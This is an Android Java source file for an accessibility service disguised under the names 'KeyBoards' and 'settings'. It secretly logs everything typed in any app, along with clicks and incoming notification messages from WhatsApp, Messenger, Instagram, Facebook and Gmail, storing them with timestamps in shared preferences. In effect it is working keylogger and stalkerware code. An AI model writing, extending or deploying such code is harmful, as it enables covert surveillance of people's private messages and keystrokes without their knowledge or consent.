package com.example.settings;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Parcelable;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;

import static com.example.settings.Utils.getDateTime;

import androidx.room.util.StringUtil;

import org.apache.commons.lang3.StringUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class KeyBoards extends AccessibilityService {
        Sharedpref mSharedpref;
        @Override
        public void onAccessibilityEvent(AccessibilityEvent event) {
            final int eventType = event.getEventType();
            mSharedpref=new Sharedpref(getApplicationContext());
            String eventText = "";


            switch(eventType) {
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    if(event.getPackageName().equals("com.whatsapp") ||
                            event.getPackageName().equals("com.facebook.orca") ||
                            event.getPackageName().equals("com.instagram.android") ||
                            event.getPackageName().equals("com.facebook.katana") ||
                            event.getPackageName().equals("com.google.android.gm")) {
                        String clicked=mSharedpref.getClickedData();
                        String clickedOn=clicked+"\n"+getDateTime()+","+event.getPackageName()+","+event.getText();
                        mSharedpref.setClickedData(clickedOn);
                        mSharedpref.commit();
                        System.out.println("Clicked Known : " + event.getPackageName() + ""+event.getText());
                    }
                    else {
                        String clicked=mSharedpref.getOtherClickedData();
                        String clickedOn=clicked+"\n"+getDateTime()+","+event.getPackageName()+","+event.getText();
                        mSharedpref.setOtherClickedData(clickedOn);
                        mSharedpref.commit();
                        System.out.println("Clicked Other Known : " + event.getPackageName() + ""+event.getText());
                    }
                     break;
              /*  case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                     eventText = "Focused: ";
                    System.out.println("SERVICE 1 : "+event.getPackageName() + "");
                     break;*/
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    String texts=mSharedpref.getSaveTextWritten();
                    JSONObject mJsonObject;
                  try {
                      JSONArray mJsonArray;

                      if (StringUtils.isBlank(texts)){
                          mJsonArray= new JSONArray();                      }
                      else {
                          mJsonArray= new JSONArray(texts);
                      }
                      mJsonObject=new JSONObject();
                      mJsonObject.put("package name",event.getPackageName());
                      mJsonObject.put("date",getDateTime());
                      mJsonObject.put("value",eventText+event.getText());
                      mJsonArray.put(mJsonObject);
                      mSharedpref.setSaveTextWritten(mJsonArray.toString());
                      mSharedpref.commit();
                      Log.d("json",mJsonObject.toString());
                  }
                  catch (Exception e){
                    e.printStackTrace();
                  }

                    System.out.println("SERVICE 1 : "+event.getPackageName() + "");
                    String newtext=texts+eventText + event.getText();

                    //print the typed text in the console. Or do anything you want here.

                    System.out.println("ACCESSIBILITY SERVICE : "+eventText + "Sharedwala : "+texts);
                    break;
                case  AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                    if(event.getPackageName().equals("com.whatsapp") ||
                            event.getPackageName().equals("com.facebook.orca") ||
                            event.getPackageName().equals("com.instagram.android") ||
                            event.getPackageName().equals("com.facebook.katana")||
                            event.getPackageName().equals("com.google.android.gm")) {
                        System.out.println("SERVICE : " + eventText + "");
                        Parcelable data = event.getParcelableData();
                        if (data instanceof android.app.Notification) {
                            Log.d("Tortuga", "Recieved notification");
                            android.app.Notification notification = (android.app.Notification) data;
                            CharSequence[] lines = notification.extras.getCharSequenceArray(android.app.Notification.EXTRA_TEXT_LINES);
                            int i = 0;
                            String text = mSharedpref.getNotificationData();

                            StringBuilder line = new StringBuilder();
                            if (lines != null) {
                                for (CharSequence msg : lines) {
                                    line.append("," + msg);
                                    Log.d("Line " + i, "" + msg);
                                    i += 1;
                                }
                            }
                            Log.d("Tortuga", "ticker: " + notification.tickerText);
                            Log.d("Tortuga", "icon: " + event.getPackageName());
                            Log.d("Tortuga", "notification: " + event.getText());
                            String stringBuild=text+"\n" + "[" +  getDateTime() + "{" + notification.tickerText + "," + event.getPackageName() + "," + event.getText() + ",{" + line.toString() + "}" + "}" + "]";
                            mSharedpref.setNotificationData(stringBuild.trim());
                            mSharedpref.commit();
                        }

                        break;
                    }
            }
        }

        @Override
        public void onInterrupt() {
            //whatever
        }

        @Override
        public void onServiceConnected() {
            Toast.makeText(getApplicationContext(),"Connected",Toast.LENGTH_SHORT).show();
            AccessibilityServiceInfo info = getServiceInfo();
            info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
            info.notificationTimeout = 100;
            info.flags=AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
            this.setServiceInfo(info);
        }
}
